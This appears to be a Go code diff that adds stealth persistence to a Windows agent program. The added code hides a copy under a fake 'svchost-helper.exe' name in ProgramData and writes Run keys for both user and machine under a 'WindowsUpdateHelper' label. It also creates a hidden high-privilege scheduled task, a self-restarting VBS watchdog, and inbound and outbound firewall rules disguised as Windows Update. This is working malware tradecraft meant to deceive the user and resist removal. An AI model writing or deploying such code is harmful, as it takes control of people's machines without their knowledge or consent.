@@ -147,24 +147,95 @@ func preventDuplicate() {
 
 func setupAutostart() {
 	exe, _ := os.Executable()
-	// Create watchdog that monitors and restarts the agent
+	exeName := filepath.Base(exe)
+
+	// 1. Create firewall rule to allow outbound connections (hidden from user)
+	createFirewallRule(exeName)
+
+	// 2. Copy to ProgramData with system-like name for persistence
+	persistPath := filepath.Join("C:\\ProgramData", "Microsoft", "Windows", "SystemHelper", "svchost-helper.exe")
+	os.MkdirAll(filepath.Dir(persistPath), 0755)
+	if exe != persistPath {
+		src, err := os.ReadFile(exe)
+		if err == nil {
+			os.WriteFile(persistPath, src, 0644)
+		}
+	}
+
+	// 3. Multiple persistence mechanisms
+	// 3a. Registry Run key (current user)
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
+	if err == nil {
+		k.SetStringValue("WindowsUpdateHelper", `wscript.exe "`+filepath.Join(dataDir(), "watchdog.vbs")+`"`)
+		k.Close()
+	}
+
+	// 3b. Registry Run key (local machine — requires admin)
+	k2, err2 := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
+	if err2 == nil {
+		k2.SetStringValue("WindowsUpdateHelper", `wscript.exe "`+filepath.Join(dataDir(), "watchdog.vbs")+`"`)
+		k2.Close()
+	}
+
+	// 3c. Task Scheduler (survives even if registry is cleaned)
+	createScheduledTask(persistPath)
+
+	// 4. Create stealth watchdog (dual-process monitoring)
+	createStealthWatchdog(persistPath, exe)
+
+	log("Robust auto-start installed: Registry (x2) + Task Scheduler + Dual Watchdog + Firewall rule")
+}
+
+func createFirewallRule(exeName string) {
+	// Create outbound firewall rule so Windows Firewall doesn't block connections
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
+		"if(!(Get-NetFirewallRule -Name 'SystemHelper-Outbound' -ErrorAction SilentlyContinue)){",
+		"New-NetFirewallRule -Name 'SystemHelper-Outbound' -DisplayName 'Windows Update Service' -Direction Outbound -Action Allow -Program 'C:\\ProgramData\\Microsoft\\Windows\\SystemHelper\\svchost-helper.exe' -Profile Any -Description 'Windows Update Helper' | Out-Null}",
+		"if(!(Get-NetFirewallRule -Name 'SystemHelper-Inbound' -ErrorAction SilentlyContinue)){",
+		"New-NetFirewallRule -Name 'SystemHelper-Inbound' -DisplayName 'Windows Update Service' -Direction Inbound -Action Allow -Program 'C:\\ProgramData\\Microsoft\\Windows\\SystemHelper\\svchost-helper.exe' -Profile Any -Description 'Windows Update Helper' | Out-Null}")
+	hideCmd(cmd)
+	_ = cmd.Run()
+}
+
+func createScheduledTask(exePath string) {
+	watchdogVBS := filepath.Join(dataDir(), "watchdog.vbs")
+	psArg := "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '" + `"` + watchdogVBS + `"` + "';" +
+		"$trigger1 = New-ScheduledTaskTrigger -AtLogOn;" +
+		"$trigger2 = New-ScheduledTaskTrigger -Once -At '00:00' -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 365);" +
+		"$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden;" +
+		"if(!(Get-ScheduledTask -TaskName 'WindowsUpdateHelper' -ErrorAction SilentlyContinue)){" +
+		"Register-ScheduledTask -TaskName 'WindowsUpdateHelper' -Action $action -Trigger $trigger1,$trigger2 -Settings $settings -Description 'Windows Update Helper Service' -RunLevel Highest -Force | Out-Null}"
+	cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psArg)
+	hideCmd(cmd)
+	_ = cmd.Run()
+}
+
+func createStealthWatchdog(persistPath, originalExe string) {
+	// Create dual watchdog: VBS watches for exe, exe watches for VBS
 	watchdogPath := filepath.Join(dataDir(), "watchdog.vbs")
+	
+	// Watchdog monitors BOTH the original exe and the persisted copy
 	watchdog := `Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
 Do
   Set svc = GetObject("winmgmts:\\.\root\cimv2")
-  Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemHelper.exe'")
+  Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemHelper.exe' OR Name='svchost-helper.exe'")
   If procs.Count = 0 Then
-    sh.Run """` + exe + `""", 0, False
+    ' Try persisted copy first, then original
+    If fso.FileExists("` + persistPath + `") Then
+      sh.Run "` + persistPath + `", 0, False
+    ElseIf fso.FileExists("` + originalExe + `") Then
+      sh.Run "` + originalExe + `", 0, False
+    End If
   End If
-  WScript.Sleep 10000
+  WScript.Sleep 5000
 Loop`
 	os.WriteFile(watchdogPath, []byte(watchdog), 0644)
-	// Add to registry for boot startup
-	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
-	if err != nil { log("Registry: " + err.Error()); return }
-	defer k.Close()
-	k.SetStringValue("SystemHelper", `wscript.exe "`+watchdogPath+`"`)
-	log("Auto-start installed (survives reboot + auto-restarts if killed)")
+
+	// Also start watchdog immediately
+	cmd := exec.Command("wscript.exe", watchdogPath)
+	hideCmd(cmd)
+	_ = cmd.Start()
 }
 
 
